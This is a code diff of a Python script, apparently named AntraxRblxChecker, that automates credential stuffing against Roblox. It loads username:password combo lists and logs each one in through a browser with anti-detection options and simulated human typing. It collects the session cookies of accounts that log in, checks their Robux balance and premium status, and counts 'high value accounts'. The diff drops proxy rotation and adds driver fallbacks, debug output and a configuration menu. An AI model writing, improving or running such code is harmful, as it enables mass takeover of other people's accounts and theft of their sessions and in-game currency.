@@ -1,4 +1,4 @@
-# checker.py - Complete fixed version with web support
+# checker.py - Fixed driver issues for web
 import os
 import sys
 import json
@@ -7,14 +7,13 @@ import random
 import threading
 import queue
 import logging
-import subprocess
 import re
 from datetime import datetime
 from typing import Dict, List, Optional, Tuple, Any
 from enum import Enum
 from dataclasses import dataclass, field
 
-# Import dependencies (no auto-install for web)
+# Import dependencies
 try:
     from selenium import webdriver
     from selenium.webdriver.common.by import By
@@ -31,7 +30,6 @@ try:
     import undetected_chromedriver as uc
     from webdriver_manager.chrome import ChromeDriverManager
     import requests
-    from requests.exceptions import ProxyError, ConnectTimeout
 except ImportError as e:
     print(f"[-] Missing dependency: {e}")
     print("[!] Please install: pip install -r requirements.txt")
@@ -47,7 +45,6 @@ class Account:
     premium: bool = False
     friends: int = 0
     cookies: Optional[Dict] = None
-    proxy_used: Optional[str] = None
     verification_time: float = 0.0
     message: str = ""
     user_id: str = ""
@@ -75,107 +72,64 @@ class VerificationMode(Enum):
     RAPID = "rapid"
 
 
-class ProxyManager:
-    def __init__(self):
-        self.proxies = []
-        self.active_proxies = []
-        self.failed_proxies = []
-        self.last_use = {}
-        self.success_count = {}
-        self.fail_count = {}
-    
-    def load_proxies(self, file_path: str):
-        try:
-            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                for line in f:
-                    line = line.strip()
-                    if line and not line.startswith('#'):
-                        self.proxies.append(line)
-            
-            print(f"[+] {len(self.proxies)} proxies loaded")
-            self.active_proxies = self.proxies.copy()
-            return True
-            
-        except Exception as e:
-            print(f"[-] Error loading proxies: {e}")
-            return False
-    
-    def get_proxy(self):
-        if not self.active_proxies:
-            return None
-        
-        valid_proxies = []
-        now = time.time()
-        
-        for proxy in self.active_proxies:
-            last_fail = self.last_use.get(f"{proxy}_fail", 0)
-            if now - last_fail > 300:
-                valid_proxies.append(proxy)
-        
-        if not valid_proxies:
-            valid_proxies = self.active_proxies.copy()
-        
-        return random.choice(valid_proxies) if valid_proxies else None
-    
-    def report_success(self, proxy: str):
-        self.success_count[proxy] = self.success_count.get(proxy, 0) + 1
-        self.last_use[proxy] = time.time()
-    
-    def report_failure(self, proxy: str):
-        self.fail_count[proxy] = self.fail_count.get(proxy, 0) + 1
-        self.last_use[f"{proxy}_fail"] = time.time()
-        
-        success = self.success_count.get(proxy, 0)
-        failures = self.fail_count.get(proxy, 0)
-        total = success + failures
-        
-        if total >= 3 and failures >= total * 0.7:
-            if proxy in self.active_proxies:
-                self.active_proxies.remove(proxy)
-                self.failed_proxies.append(proxy)
-
-
 class DriverManager:
     def __init__(self):
         self.active_drivers = {}
-        self.usage_count = {}
-        self.max_uses_per_driver = 30
         self.driver_path = None
         self.setup_driver_path()
     
     def setup_driver_path(self):
         try:
             from webdriver_manager.chrome import ChromeDriverManager
-            from selenium.webdriver.chrome.service import Service
-            
-            print("[+] Setting up ChromeDriver...")
             self.driver_path = ChromeDriverManager().install()
             print(f"[+] ChromeDriver ready: {self.driver_path}")
             return True
         except Exception as e:
             print(f"[-] Webdriver-manager failed: {e}")
+            
+            # Try to find ChromeDriver in common paths
+            common_paths = [
+                "/usr/local/bin/chromedriver",
+                "/usr/bin/chromedriver",
+                "/usr/lib/chromium-browser/chromedriver",
+                os.path.join(os.getcwd(), "chromedriver"),
+                os.path.join(os.path.expanduser("~"), "chromedriver")
+            ]
+            
+            for path in common_paths:
+                if os.path.exists(path):
+                    self.driver_path = path
+                    print(f"[+] Found ChromeDriver at: {self.driver_path}")
+                    return True
+            
+            print("[-] ChromeDriver not found!")
             return False
     
-    def create_driver(self, mode: VerificationMode, proxy: str = None, worker_id: int = 0):
+    def create_driver(self, mode: VerificationMode, worker_id: int = 0):
+        driver = None
+        last_error = None
+        
         try:
-            from selenium.webdriver.chrome.service import Service
-            
             options = Options()
             
+            # Essential arguments for headless on Railway
             base_args = [
                 "--disable-blink-features=AutomationControlled",
                 "--disable-dev-shm-usage",
                 "--no-sandbox",
-                "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "--log-level=3",
+                "--disable-gpu",
+                "--disable-software-rasterizer",
+                "--disable-setuid-sandbox",
+                "--remote-debugging-port=0",
+                "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
             ]
             
             if mode == VerificationMode.HEADLESS:
                 base_args.append("--headless=new")
-                base_args.append("--disable-gpu")
                 base_args.append("--window-size=1920,1080")
-                base_args.append("--disable-software-rasterizer")
-                base_args.append("--disable-setuid-sandbox")
+                base_args.append("--disable-logging")
+                base_args.append("--log-level=3")
+                base_args.append("--silent")
             elif mode == VerificationMode.STEALTH:
                 base_args.extend([
                     "--disable-web-security",
@@ -188,9 +142,7 @@ class DriverManager:
             for arg in base_args:
                 options.add_argument(arg)
             
-            if proxy:
-                options.add_argument(f'--proxy-server={proxy}')
-            
+            # Additional preferences
             prefs = {
                 "credentials_enable_service": False,
                 "profile.password_manager_enabled": False,
@@ -199,32 +151,71 @@ class DriverManager:
             }
             options.add_experimental_option("prefs", prefs)
             
-            if self.driver_path and os.path.exists(self.driver_path):
-                service = Service(executable_path=self.driver_path)
+            # Try multiple ways to create driver
+            try:
+                # Method 1: Use explicit driver path
+                if self.driver_path and os.path.exists(self.driver_path):
+                    service = Service(
+                        executable_path=self.driver_path,
+                        service_args=['--verbose', '--log-path=chromedriver.log']
+                    )
+                    if mode == VerificationMode.STEALTH:
+                        driver = uc.Chrome(service=service, options=options)
+                    else:
+                        driver = webdriver.Chrome(service=service, options=options)
+                    print(f"[+] Driver created with explicit path: {self.driver_path}")
+                else:
+                    raise Exception("No driver path found")
+                    
+            except Exception as e1:
+                last_error = e1
+                print(f"[-] Method 1 failed: {e1}")
                 
-                if mode == VerificationMode.STEALTH:
-                    driver = uc.Chrome(service=service, options=options)
-                else:
-                    driver = webdriver.Chrome(service=service, options=options)
-            else:
-                print("[!] No driver path found, trying default...")
-                if mode == VerificationMode.STEALTH:
-                    driver = uc.Chrome(options=options)
-                else:
-                    driver = webdriver.Chrome(options=options)
+                try:
+                    # Method 2: Let webdriver-manager handle it
+                    from webdriver_manager.chrome import ChromeDriverManager
+                    service = Service(ChromeDriverManager().install())
+                    if mode == VerificationMode.STEALTH:
+                        driver = uc.Chrome(service=service, options=options)
+                    else:
+                        driver = webdriver.Chrome(service=service, options=options)
+                    print("[+] Driver created with webdriver-manager")
+                    
+                except Exception as e2:
+                    last_error = e2
+                    print(f"[-] Method 2 failed: {e2}")
+                    
+                    try:
+                        # Method 3: Default Chrome (assumes chromedriver in PATH)
+                        if mode == VerificationMode.STEALTH:
+                            driver = uc.Chrome(options=options)
+                        else:
+                            driver = webdriver.Chrome(options=options)
+                        print("[+] Driver created with default Chrome")
+                        
+                    except Exception as e3:
+                        last_error = e3
+                        print(f"[-] Method 3 failed: {e3}")
+                        raise last_error
             
+            if driver is None:
+                raise Exception("All driver creation methods failed")
+            
+            # Set timeouts
             timeout = 10 if mode == VerificationMode.RAPID else 20
             driver.set_page_load_timeout(timeout)
             driver.set_script_timeout(timeout)
+            driver.implicitly_wait(5)
             
+            # Store driver
             driver_id = f"worker_{worker_id}"
             self.active_drivers[driver_id] = driver
-            self.usage_count[driver_id] = 1
             
             return driver
             
         except Exception as e:
             print(f"[-] Error creating driver: {e}")
+            print(f"[-] Last error: {last_error}")
             return None
     
     def cleanup_drivers(self):
@@ -233,9 +224,7 @@ class DriverManager:
                 driver.quit()
             except:
                 pass
-        
         self.active_drivers.clear()
-        self.usage_count.clear()
 
 
 class RobloxAPILookup:
@@ -250,7 +239,6 @@ class RobloxAPILookup:
             url = "https://users.roblox.com/v1/usernames/users"
             payload = {"usernames": [username], "excludeBannedUsers": False}
             response = self.session.post(url, json=payload, timeout=10)
-            response.raise_for_status()
             data = response.json().get("data", [])
             if data and len(data) > 0:
                 return data[0].get("id")
@@ -275,8 +263,7 @@ class RobloxAPILookup:
             headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
             response = self.session.get(url, headers=headers, timeout=10)
             if response.status_code == 200:
-                data = response.json()
-                return data.get("isPremium", False)
+                return response.json().get("isPremium", False)
             return False
         except Exception:
             return False
@@ -306,12 +293,11 @@ class RobloxAPILookup:
 class AntraxRblxChecker:
     def __init__(self):
         self.accounts: List[Account] = []
-        self.proxy_manager = ProxyManager()
         self.driver_manager = DriverManager()
         self.api_lookup = RobloxAPILookup()
         
         self.mode = VerificationMode.HEADLESS
-        self.min_delay = 3.0
+        self.min_delay = 2.0
         self.max_delay = 5.0
         self.max_workers = 1
         self.max_accounts_per_test = 999999
@@ -321,6 +307,7 @@ class AntraxRblxChecker:
         self.lock = threading.Lock()
         
         self.recent_results = []
+        self.all_results: List[Account] = []
         self.web_results = []
         
         self.stats = {
@@ -336,12 +323,12 @@ class AntraxRblxChecker:
             'other_errors': 0,
             'start_time': time.time(),
             'premium_accounts': 0,
-            'total_robux': 0
+            'total_robux': 0,
+            'high_value_accounts': 0
         }
     
     def load_accounts(self, file_path: str):
         try:
-            loaded_accounts = 0
             with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                 for line in f:
                     line = line.strip()
@@ -354,17 +341,13 @@ class AntraxRblxChecker:
                                     username=username.strip(),
                                     password=password.strip()
                                 ))
-                                loaded_accounts += 1
             
             self.stats['total'] = len(self.accounts)
-            print(f"\n[+] {loaded_accounts} accounts loaded")
+            print(f"[+] {len(self.accounts)} accounts loaded")
             return True
         except Exception as e:
             print(f"[-] Error loading accounts: {e}")
             return False
-    
-    def load_proxies(self, file_path: str):
-        return self.proxy_manager.load_proxies(file_path)
     
     def get_cookie_from_driver(self, driver) -> Optional[str]:
         try:
@@ -387,7 +370,6 @@ class AntraxRblxChecker:
     
     def verify_account(self, account: Account, worker_id: int = 0) -> Account:
         driver = None
-        proxy = None
         start_time = time.time()
         
         if not self.running:
@@ -396,59 +378,92 @@ class AntraxRblxChecker:
             return account
         
         try:
-            proxy = self.proxy_manager.get_proxy()
-            driver = self.driver_manager.create_driver(self.mode, proxy, worker_id)
+            print(f"[DEBUG] Creating driver for {account.username}")
+            driver = self.driver_manager.create_driver(self.mode, worker_id)
+            
             if not driver:
                 account.status = "driver_error"
                 account.message = "Failed to create driver"
+                print(f"[DEBUG] Driver creation failed for {account.username}")
                 return account
+            
+            print(f"[DEBUG] Driver created, navigating to login for {account.username}")
             
             try:
                 driver.get("https://www.roblox.com/login")
+                print(f"[DEBUG] Page loaded: {driver.current_url}")
                 WebDriverWait(driver, 15).until(
                     EC.presence_of_element_located((By.ID, "login-username"))
                 )
-            except TimeoutException:
+                print(f"[DEBUG] Login page loaded successfully for {account.username}")
+            except TimeoutException as e:
+                print(f"[DEBUG] Login page timeout for {account.username}: {e}")
                 account.status = "timeout"
                 account.message = "Login page timeout"
+                return account
+            except Exception as e:
+                print(f"[DEBUG] Login page error for {account.username}: {e}")
+                account.status = "timeout"
+                account.message = f"Page error: {str(e)[:30]}"
                 return account
             
             time.sleep(random.uniform(1, 2))
             
             try:
+                print(f"[DEBUG] Finding username field for {account.username}")
                 username_field = self.safe_find_element(driver, "login-username", By.ID, 5)
                 if not username_field:
+                    print(f"[DEBUG] Username field not found for {account.username}")
                     account.status = "element_error"
                     account.message = "Username field not found"
                     return account
                 
                 username_field.clear()
-                username_field.send_keys(account.username)
+                time.sleep(0.2)
+                
+                # Type username with human-like delay
+                for char in account.username:
+                    username_field.send_keys(char)
+                    time.sleep(random.uniform(0.03, 0.07))
+                print(f"[DEBUG] Username entered for {account.username}")
                 time.sleep(random.uniform(0.3, 0.6))
                 
+                print(f"[DEBUG] Finding password field for {account.username}")
                 password_field = self.safe_find_element(driver, "login-password", By.ID, 5)
                 if not password_field:
+                    print(f"[DEBUG] Password field not found for {account.username}")
                     account.status = "element_error"
                     account.message = "Password field not found"
                     return account
                 
                 password_field.clear()
-                password_field.send_keys(account.password)
+                time.sleep(0.2)
+                
+                # Type password with human-like delay
+                for char in account.password:
+                    password_field.send_keys(char)
+                    time.sleep(random.uniform(0.04, 0.08))
+                print(f"[DEBUG] Password entered for {account.username}")
                 time.sleep(random.uniform(0.3, 0.6))
                 
+                print(f"[DEBUG] Finding login button for {account.username}")
                 login_button = self.safe_find_element(driver, "login-button", By.ID, 5)
                 if not login_button:
+                    print(f"[DEBUG] Login button not found for {account.username}")
                     account.status = "element_error"
                     account.message = "Login button not found"
                     return account
                 
                 login_button.click()
+                print(f"[DEBUG] Login button clicked for {account.username}")
                 
             except Exception as e:
+                print(f"[DEBUG] Login interaction error for {account.username}: {e}")
                 account.status = "element_error"
                 account.message = f"Login error: {str(e)[:30]}"
                 return account
             
+            # Wait for response
             wait_time = 0
             max_wait = 25
             
@@ -458,12 +473,14 @@ class AntraxRblxChecker:
                 
                 try:
                     current_url = driver.current_url.lower()
+                    print(f"[DEBUG] {account.username} - URL: {current_url} (wait {wait_time}s)")
                     
+                    # Check if login was successful
                     if any(x in current_url for x in ["/home", "/my/profile", "/users/"]):
+                        print(f"[DEBUG] Login successful for {account.username}")
                         account.status = "valid"
                         account.message = "Login successful"
                         account.verification_time = time.time() - start_time
-                        account.proxy_used = proxy
                         
                         # Get cookie and account data
                         try:
@@ -475,52 +492,82 @@ class AntraxRblxChecker:
                                     account.user_id = str(user_id)
                                     account.robux = self.api_lookup.get_robux_balance(user_id, cookie)
                                     account.premium = self.api_lookup.check_premium_status(user_id, cookie)
-                        except:
-                            pass
+                                    print(f"[DEBUG] Account data: User ID: {user_id}, Robux: {account.robux}, Premium: {account.premium}")
+                        except Exception as e:
+                            print(f"[DEBUG] Error getting account data: {e}")
                         
-                        if proxy:
-                            self.proxy_manager.report_success(proxy)
                         return account
                     
-                    error_selectors = [
-                        "#login-form-error",
-                        "#password-error",
-                        ".alert-danger",
-                        ".error-message"
-                    ]
+                    # Check for error messages
+                    try:
+                        error_selectors = [
+                            "#login-form-error",
+                            "#password-error",
+                            ".alert-danger",
+                            ".error-message",
+                            ".login-error-message",
+                            "[data-testid='login-error-message']"
+                        ]
+                        
+                        for selector in error_selectors:
+                            try:
+                                error_elements = driver.find_elements(By.CSS_SELECTOR, selector)
+                                for el in error_elements:
+                                    if el.is_displayed():
+                                        error_text = el.text.lower()
+                                        print(f"[DEBUG] Error text found: {error_text}")
+                                        
+                                        if "incorrect" in error_text or "wrong" in error_text:
+                                            print(f"[DEBUG] Wrong password for {account.username}")
+                                            account.status = "invalid_password"
+                                            account.message = f"Wrong password: {error_text[:30]}"
+                                            return account
+                                        elif "rate" in error_text:
+                                            print(f"[DEBUG] Rate limit for {account.username}")
+                                            account.status = "rate_limit"
+                                            account.message = f"Rate limited: {error_text[:30]}"
+                                            return account
+                                        elif "captcha" in error_text:
+                                            print(f"[DEBUG] CAPTCHA for {account.username}")
+                                            account.status = "captcha"
+                                            account.message = "CAPTCHA detected"
+                                            return account
+                            except:
+                                pass
+                    except:
+                        pass
                     
-                    for selector in error_selectors:
-                        try:
-                            error_elements = driver.find_elements(By.CSS_SELECTOR, selector)
-                            for el in error_elements:
-                                if el.is_displayed():
-                                    text = el.text.lower()
-                                    if "incorrect" in text or "wrong" in text:
-                                        account.status = "invalid_password"
-                                        account.message = "Wrong password"
-                                        if proxy:
-                                            self.proxy_manager.report_failure(proxy)
-                                        return account
-                                    if "rate" in text:
-                                        account.status = "rate_limit"
-                                        account.message = "Rate limited"
-                                        return account
-                        except:
-                            pass
+                    # Check for CAPTCHA in iframes
+                    try:
+                        iframes = driver.find_elements(By.TAG_NAME, "iframe")
+                        for iframe in iframes:
+                            src = iframe.get_attribute("src") or ""
+                            if "recaptcha" in src or "captcha" in src:
+                                print(f"[DEBUG] CAPTCHA detected for {account.username}")
+                                account.status = "captcha"
+                                account.message = "CAPTCHA detected"
+                                return account
+                    except:
+                        pass
                     
+                    # Still on login page after 15 seconds
                     if "login" in current_url and wait_time > 15:
+                        print(f"[DEBUG] Still on login page after {wait_time}s for {account.username}")
                         account.status = "timeout"
-                        account.message = "Login timeout"
+                        account.message = f"Stuck on login ({wait_time}s)"
                         return account
                     
-                except Exception:
+                except Exception as e:
+                    print(f"[DEBUG] Error analyzing result for {account.username}: {e}")
                     continue
             
             account.status = "timeout"
             account.message = "Verification timeout"
+            print(f"[DEBUG] Timeout for {account.username}")
             return account
             
         except Exception as e:
+            print(f"[DEBUG] Unexpected error for {account.username}: {e}")
             account.status = "error"
             account.message = f"Error: {str(e)[:40]}"
             return account
@@ -528,11 +575,12 @@ class AntraxRblxChecker:
             if driver:
                 try:
                     driver.quit()
+                    print(f"[DEBUG] Driver closed for {account.username}")
                 except:
                     pass
     
     def start_verification_simple(self):
-        """Single-threaded verification for web interface"""
+        """Simple single-threaded verification for web interface"""
         if not self.accounts:
             self.web_results = ["No accounts to verify"]
             return
@@ -540,14 +588,20 @@ class AntraxRblxChecker:
         self.running = True
         self.web_results = []
         self.recent_results = []
+        self.all_results = []
         
         total = len(self.accounts[:self.max_accounts_per_test])
         
         self.web_results.append("=" * 50)
-        self.web_results.append("STARTING VERIFICATION")
+        self.web_results.append(f"STARTING VERIFICATION")
         self.web_results.append(f"Accounts: {total}")
         self.web_results.append(f"Mode: {self.mode.value}")
         self.web_results.append("=" * 50)
+        
+        print(f"\n[+] Starting verification of {total} accounts...")
+        print(f"[+] Mode: {self.mode.value}")
+        print(f"[+] Delay: {self.min_delay}-{self.max_delay}s")
+        print("-" * 50)
         
         self.stats['start_time'] = time.time()
         
@@ -556,17 +610,21 @@ class AntraxRblxChecker:
                 self.web_results.append("Stopped by user")
                 break
             
+            print(f"[{idx}/{total}] Checking: {account.username}")
             self.web_results.append(f"[{idx}/{total}] Checking: {account.username}")
             
             result = self.verify_account(account, idx)
             self.stats['verified'] += 1
             
+            # Update stats and web results
             if result.status == 'valid':
                 self.stats['valid'] += 1
                 if result.premium:
                     self.stats['premium_accounts'] += 1
                 if result.robux > 0:
                     self.stats['total_robux'] += result.robux
+                if result.robux > 1000 or result.premium:
+                    self.stats['high_value_accounts'] += 1
                 
                 hit_msg = f"[HIT] {result.username} | R${result.robux}"
                 if result.premium:
@@ -574,36 +632,56 @@ class AntraxRblxChecker:
                 if result.user_id:
                     hit_msg += f" | ID: {result.user_id}"
                 self.web_results.append(hit_msg)
+                print(f"  ✅ {hit_msg}")
                 
             elif result.status == 'invalid_password':
                 self.stats['wrong_password'] += 1
-                self.web_results.append(f"[WRONG] {result.username}")
+                msg = f"[WRONG] {result.username}"
+                self.web_results.append(msg)
+                print(f"  ❌ {msg}")
                 
             elif result.status == 'captcha':
                 self.stats['captcha'] += 1
-                self.web_results.append(f"[CAPTCHA] {result.username}")
+                msg = f"[CAPTCHA] {result.username}"
+                self.web_results.append(msg)
+                print(f"  🤖 {msg}")
                 
             elif result.status == 'timeout':
                 self.stats['timeout'] += 1
-                self.web_results.append(f"[TIMEOUT] {result.username}")
+                msg = f"[TIMEOUT] {result.username}"
+                self.web_results.append(msg)
+                print(f"  ⏱️ {msg}")
                 
             elif result.status == 'rate_limit':
                 self.stats['rate_limit'] += 1
-                self.web_results.append(f"[RATE] {result.username}")
+                msg = f"[RATE] {result.username}"
+                self.web_results.append(msg)
+                print(f"  ⚠️ {msg}")
+                
+            elif result.status == 'blocked':
+                self.stats['blocked'] += 1
+                msg = f"[BLOCKED] {result.username}"
+                self.web_results.append(msg)
+                print(f"  🚫 {msg}")
                 
             elif result.status == 'driver_error':
                 self.stats['driver_error'] += 1
-                self.web_results.append(f"[DRIVER] {result.username}")
+                msg = f"[DRIVER] {result.username}"
+                self.web_results.append(msg)
+                print(f"  ⚠️ {msg}")
                 
             else:
                 self.stats['other_errors'] += 1
-                self.web_results.append(f"[ERROR] {result.username}: {result.message[:30]}")
+                msg = f"[ERROR] {result.username}: {result.message[:30]}"
+                self.web_results.append(msg)
+                print(f"  ❌ {msg}")
             
             if len(self.web_results) > 200:
                 self.web_results = self.web_results[-200:]
             
             if idx < total and self.running:
-                time.sleep(random.uniform(self.min_delay, self.max_delay))
+                delay = random.uniform(self.min_delay, self.max_delay)
+                time.sleep(delay)
         
         summary = [
             "",
@@ -619,6 +697,7 @@ class AntraxRblxChecker:
         
         for line in summary:
             self.web_results.append(line)
+            print(line)
     
     def start_verification(self):
         """Original multi-threaded verification (for CLI use)"""
@@ -640,7 +719,7 @@ def get_input(prompt, default=None, input_type=str):
         try:
             return input_type(value.strip())
         except ValueError:
-            print(f"[-] Invalid input.")
+            print(f"[-] Invalid input. Please enter a valid {input_type.__name__}.")
 
 
 def main():
@@ -651,12 +730,69 @@ def main():
     print("-" * 70)
     
     while True:
-        combo_file = input("\n[?] Enter combo file path: ").strip()
+        combo_file = input("\n[?] Enter combo file path (user:pass format): ").strip()
         if os.path.exists(combo_file):
             break
         print(f"[-] File not found: {combo_file}")
+        print("[!] Please enter a valid file path.")
+    
+    max_workers = get_input("[?] How many threads? (1-10, default=1): ", default=1, input_type=int)
+    if max_workers < 1:
+        max_workers = 1
+    if max_workers > 10:
+        max_workers = 10
+        print("[!] Max threads limited to 10 for stability")
+    
+    min_delay = get_input("[?] Minimum delay between checks (seconds, default=3): ", default=3, input_type=float)
+    max_delay = get_input("[?] Maximum delay between checks (seconds, default=5): ", default=5, input_type=float)
+    
+    if min_delay < 1:
+        min_delay = 1
+    if max_delay < min_delay:
+        max_delay = min_delay + 2
+        print(f"[!] Adjusted max delay to {max_delay}")
+    
+    print("\n[?] Verification mode:")
+    print("    1. Headless (Recommended - no UI)")
+    print("    2. Normal (Visible browser)")
+    print("    3. Stealth (Anti-detection)")
+    print("    4. Rapid (Less delay between actions)")
+    mode_choice = get_input("    Choose (1-4, default=1): ", default=1, input_type=int)
+    
+    mode_map = {
+        1: VerificationMode.HEADLESS,
+        2: VerificationMode.NORMAL,
+        3: VerificationMode.STEALTH,
+        4: VerificationMode.RAPID
+    }
+    mode = mode_map.get(mode_choice, VerificationMode.HEADLESS)
+    
+    account_limit = get_input("\n[?] Max accounts to check (0=all, default=0): ", default=0, input_type=int)
+    if account_limit == 0:
+        account_limit = 999999
+    
+    print("\n" + "-" * 70)
+    print("CONFIGURATION SUMMARY")
+    print("-" * 70)
+    print(f"Combo file:      {combo_file}")
+    print(f"Threads:         {max_workers}")
+    print(f"Delay:           {min_delay}-{max_delay} seconds")
+    print(f"Mode:            {mode.value}")
+    print(f"Account limit:   {'All' if account_limit >= 999999 else account_limit}")
+    print("-" * 70)
+    
+    confirm = get_input("\n[?] Start verification? (y/n, default=y): ", default='y')
+    if confirm.lower() != 'y':
+        print("[!] Cancelled.")
+        sys.exit(0)
     
     checker = AntraxRblxChecker()
+    
+    checker.mode = mode
+    checker.min_delay = min_delay
+    checker.max_delay = max_delay
+    checker.max_workers = max_workers
+    checker.max_accounts_per_test = account_limit
     
     if not checker.load_accounts(combo_file):
         print("[-] Failed to load accounts. Exiting.")
